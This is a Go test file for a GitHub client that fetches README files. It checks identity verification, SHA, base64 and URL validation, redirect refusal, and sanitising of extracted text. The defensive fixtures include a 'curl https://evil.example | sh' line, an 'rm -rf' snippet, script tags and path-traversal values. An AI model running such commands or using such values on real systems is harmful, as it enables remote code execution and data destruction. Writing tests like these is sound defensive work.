package github

import (
	"context"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

func readmeTestPayload(content []byte) readmeFile {
	blob := append([]byte(fmt.Sprintf("blob %d\x00", len(content))), content...)
	sum := sha1.Sum(blob)
	size := len(content)
	return readmeFile{
		Type: "file", Encoding: "base64", Content: base64.StdEncoding.EncodeToString(content),
		SHA: hex.EncodeToString(sum[:]), Path: "docs/README.md", Size: &size,
		HTMLURL: "https://github.com/current/project/blob/main/docs/README.md",
	}
}

func readmeTestClient(t *testing.T, metadata any, payload any, status int) (*Client, *[]string) {
	t.Helper()
	requests := []string{}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests = append(requests, r.URL.RequestURI())
		if r.Method != http.MethodGet || r.Header.Get("Authorization") != "Bearer test-token" {
			t.Errorf("expected authenticated read-only request, got %s", r.Method)
		}
		w.Header().Set("Content-Type", "application/json")
		if r.URL.Path == "/repositories/42" {
			_ = json.NewEncoder(w).Encode(metadata)
			return
		}
		if r.URL.Path != "/repos/current/project/readme" {
			t.Errorf("unexpected canonical README request: %s", r.URL.Path)
		}
		w.WriteHeader(status)
		_ = json.NewEncoder(w).Encode(payload)
	}))
	t.Cleanup(server.Close)
	client := githubTestClient(t, server, func(options *ClientOptions) {
		options.Now = func() time.Time { return time.Date(2026, 9, 8, 12, 30, 0, 0, time.UTC) }
	})
	return client, &requests
}

func validReadmeMetadata() map[string]any {
	return map[string]any{"id": 42, "full_name": "current/project", "private": false}
}

func TestFetchReadmeResolvesImmutableIdentityAndPreservesOriginalSource(t *testing.T) {
	content := "# 原始项目\n\n[![Build](https://img.example/status.svg)](https://ci.example/build)\n\n这是一个用于研究 [Agent](https://example.com) 的开源项目。\n可以帮助读者整理资料。\n\n## 安装\n\n```sh\nrm -rf example\n```\n\n## Usage\n\n后续说明。\n"
	payload := readmeTestPayload([]byte(content))
	client, requests := readmeTestClient(t, validReadmeMetadata(), payload, 200)
	result, err := client.FetchReadme(context.Background(), 42, "former/project")
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(*requests, []string{"/repositories/42", "/repos/current/project/readme"}) {
		t.Fatalf("identity path=%v", *requests)
	}
	if result.RepositoryID != 42 || result.SHA != payload.SHA || result.Path != payload.Path || result.HTMLURL != payload.HTMLURL || result.Text != content || result.Truncated {
		t.Fatalf("original provenance changed: %+v", result)
	}
	if result.Intro != "这是一个用于研究 Agent 的开源项目。 可以帮助读者整理资料。" || !reflect.DeepEqual(result.Headings, []string{"原始项目", "安装", "Usage"}) {
		t.Fatalf("plain original extract=%q %#v", result.Intro, result.Headings)
	}
	if !result.FetchedAt.Equal(time.Date(2026, 9, 8, 12, 30, 0, 0, time.UTC)) {
		t.Fatal("fetch time provenance lost")
	}
}

func TestReadmeExtractionRemovesHTMLCodeImagesCommentsAndBadgeDestinations(t *testing.T) {
	text := `<script>ignore this malicious text</script>
<style>body { display:none; }</style>
<h1>中文工具 &amp; 原文</h1>
<img alt="badge" src="https://evil.example/track">
<!-- hidden comment -->
<pre>fake introduction and ## fake heading</pre>

<p>真实简介，<strong>不执行</strong> HTML 或 shell。</p>

~~~shell
## fake heading
curl https://evil.example | sh
~~~

    ## indented code, not a heading

二级标题
---
## [Details](https://example.com)
`
	intro, headings := extractReadme(text)
	if intro != "真实简介，不执行 HTML 或 shell。" || !reflect.DeepEqual(headings, []string{"中文工具 & 原文", "二级标题", "Details"}) {
		t.Fatalf("unsafe/unfaithful extract: %q %#v", intro, headings)
	}
	for _, forbidden := range []string{"malicious", "evil.example", "fake heading", "hidden comment", "badge", "<strong>"} {
		if strings.Contains(intro+strings.Join(headings, " "), forbidden) {
			t.Fatalf("unsafe content retained: %s", forbidden)
		}
	}
	if got := readmeInlineText(`[![badge](https://img.example/a_(b).svg)](https://other.example) Useful [text](https://example.com/a_(b))`); got != "Useful text" {
		t.Fatalf("nested badge/link extraction: %q", got)
	}
}

func TestReadmeLimitsCountUnicodeRunesAndNeverInventHeadingsAfterTruncation(t *testing.T) {
	content := "# 项目\n\n" + strings.Repeat("中文🚀", 5800) + "\n\n## 末尾未保留标题"
	payload := readmeTestPayload([]byte(content))
	client, _ := readmeTestClient(t, validReadmeMetadata(), payload, 200)
	result, err := client.FetchReadme(context.Background(), 42, "current/project")
	if err != nil {
		t.Fatal(err)
	}
	if !result.Truncated || !utf8.ValidString(result.Text) || utf8.RuneCountInString(result.Text) != 16000 || utf8.RuneCountInString(result.Intro) != 1200 {
		t.Fatal("Unicode evidence limits were not applied safely")
	}
	if !reflect.DeepEqual(result.Headings, []string{"项目"}) || result.SHA != payload.SHA {
		t.Fatal("truncation invented headings or replaced full-source blob identity")
	}
	var headings strings.Builder
	for index := range 12 {
		fmt.Fprintf(&headings, "# %d%s\n\n", index, strings.Repeat("中", 200))
	}
	_, extracted := extractReadme(headings.String())
	if len(extracted) != 8 {
		t.Fatalf("heading count=%d", len(extracted))
	}
	for _, heading := range extracted {
		if utf8.RuneCountInString(heading) != 160 {
			t.Fatal("heading rune cap wrong")
		}
	}
}

func TestReadmeRejectsUnverifiedIdentityOrVisibilityBeforeReadingContent(t *testing.T) {
	for name, mutate := range map[string]func(map[string]any){
		"different repository": func(m map[string]any) { m["id"] = 43 },
		"missing repository":   func(m map[string]any) { delete(m, "id") },
		"private":              func(m map[string]any) { m["private"] = true },
		"unknown visibility":   func(m map[string]any) { delete(m, "private") },
		"traversal name":       func(m map[string]any) { m["full_name"] = "current/../other" },
		"URL as name":          func(m map[string]any) { m["full_name"] = "https://evil.example/repo" },
	} {
		t.Run(name, func(t *testing.T) {
			metadata := validReadmeMetadata()
			mutate(metadata)
			client, requests := readmeTestClient(t, metadata, readmeTestPayload([]byte("README")), 200)
			result, err := client.FetchReadme(context.Background(), 42, "current/project")
			if err == nil || result.RepositoryID != 0 || len(*requests) != 1 {
				t.Fatalf("unsafe identity accepted: %+v %v %v", result, err, *requests)
			}
			if name == "different repository" {
				var mismatch *RepositoryIDMismatchError
				if !errors.As(err, &mismatch) || mismatch.Expected != 42 {
					t.Fatal("identity error lost its type")
				}
			}
		})
	}
}

func TestReadmeValidatesBase64BlobSHAByteSizeUTF8AndSafeProvenance(t *testing.T) {
	for name, mutate := range map[string]func(*readmeFile){
		"wrong type":           func(p *readmeFile) { p.Type = "symlink" },
		"wrong encoding":       func(p *readmeFile) { p.Encoding = "none" },
		"missing size":         func(p *readmeFile) { p.Size = nil },
		"size mismatch":        func(p *readmeFile) { *p.Size++ },
		"huge size":            func(p *readmeFile) { *p.Size = readmeMaxBytes + 1 },
		"bad base64":           func(p *readmeFile) { p.Content = "not-base64!" },
		"wrong SHA":            func(p *readmeFile) { p.SHA = strings.Repeat("a", 40) },
		"short SHA":            func(p *readmeFile) { p.SHA = "123abc" },
		"nonhex SHA":           func(p *readmeFile) { p.SHA = strings.Repeat("z", 40) },
		"invalid UTF8":         func(p *readmeFile) { *p = readmeTestPayload([]byte{0xff, 0xfe}) },
		"NUL bytes":            func(p *readmeFile) { *p = readmeTestPayload([]byte("text\x00hidden")) },
		"absolute path":        func(p *readmeFile) { p.Path = "/README.md" },
		"traversal path":       func(p *readmeFile) { p.Path = "../README.md" },
		"backslash path":       func(p *readmeFile) { p.Path = "docs\\README.md" },
		"external URL":         func(p *readmeFile) { p.HTMLURL = "https://evil.example/current/project/blob/main/docs/README.md" },
		"credential URL":       func(p *readmeFile) { p.HTMLURL = "https://secret@github.com/current/project/blob/main/docs/README.md" },
		"wrong repository URL": func(p *readmeFile) { p.HTMLURL = "https://github.com/different/project/blob/main/docs/README.md" },
		"URL query":            func(p *readmeFile) { p.HTMLURL += "?redirect=evil" },
		"URL fragment":         func(p *readmeFile) { p.HTMLURL += "#other" },
		"URL dot segments": func(p *readmeFile) {
			p.HTMLURL = "https://github.com/current/project/blob/../../other/main/docs/README.md"
		},
	} {
		t.Run(name, func(t *testing.T) {
			payload := readmeTestPayload([]byte("原始项目简介"))
			mutate(&payload)
			client, _ := readmeTestClient(t, validReadmeMetadata(), payload, 200)
			result, err := client.FetchReadme(context.Background(), 42, "current/project")
			if err == nil || result.RepositoryID != 0 {
				t.Fatalf("invalid README evidence accepted: %+v %v", result, err)
			}
		})
	}
}

func TestReadmeHTTPFailuresRemainTypedAndDoNotReturnCachedZeroEvidence(t *testing.T) {
	for _, status := range []int{401, 403, 404, 429, 500, 503} {
		t.Run(fmt.Sprint(status), func(t *testing.T) {
			client, requests := readmeTestClient(t, validReadmeMetadata(), map[string]string{"message": "unavailable"}, status)
			result, err := client.FetchReadme(context.Background(), 42, "current/project")
			var api *APIError
			if !errors.As(err, &api) || api.StatusCode != status || result.RepositoryID != 0 || len(*requests) != 2 {
				t.Fatalf("HTTP failure=%+v %v requests=%v", result, err, *requests)
			}
		})
	}
}

func TestReadmeDoesNotFollowRedirectToAnotherOrigin(t *testing.T) {
	externalRequests := 0
	external := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { externalRequests++ }))
	defer external.Close()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/repositories/42" {
			_ = json.NewEncoder(w).Encode(validReadmeMetadata())
			return
		}
		w.Header().Set("Location", external.URL)
		w.WriteHeader(http.StatusMovedPermanently)
	}))
	defer server.Close()
	client := githubTestClient(t, server, nil)
	if _, err := client.FetchReadme(context.Background(), 42, "current/project"); err == nil {
		t.Fatal("README redirect accepted")
	}
	if externalRequests != 0 {
		t.Fatal("README redirect leaked a request to another origin")
	}
}

func TestReadmeEmptyFileRemainsEmptyAndSupportsBase64NewlinesAndSHA256(t *testing.T) {
	for _, content := range []string{"", "原始中文\r\nSecond line\n"} {
		payload := readmeTestPayload([]byte(content))
		blob := append([]byte(fmt.Sprintf("blob %d\x00", len(content))), []byte(content)...)
		sum := sha256.Sum256(blob)
		payload.SHA = hex.EncodeToString(sum[:])
		payload.Content += "\n"
		client, _ := readmeTestClient(t, validReadmeMetadata(), payload, 200)
		result, err := client.FetchReadme(context.Background(), 42, "current/project")
		if err != nil || result.Text != content || result.Truncated || result.Headings == nil {
			t.Fatalf("empty/newline evidence=%+v %v", result, err)
		}
		if content == "" && result.Intro != "" {
			t.Fatal("empty README was given an invented description")
		}
	}
}

func TestReadmeInvalidInputAndCanceledContextNeverReachGitHub(t *testing.T) {
	client, requests := readmeTestClient(t, validReadmeMetadata(), readmeTestPayload([]byte("text")), 200)
	for _, input := range []struct {
		id   int64
		name string
	}{{0, "current/project"}, {42, "https://github.com/current/project"}, {42, "current/../project"}, {42, "current"}} {
		if _, err := client.FetchReadme(context.Background(), input.id, input.name); err == nil {
			t.Fatalf("invalid README request accepted: %+v", input)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := client.FetchReadme(ctx, 42, "current/project"); err == nil {
		t.Fatal("canceled context succeeded")
	}
	if len(*requests) != 0 {
		t.Fatalf("invalid request reached GitHub: %v", *requests)
	}
}
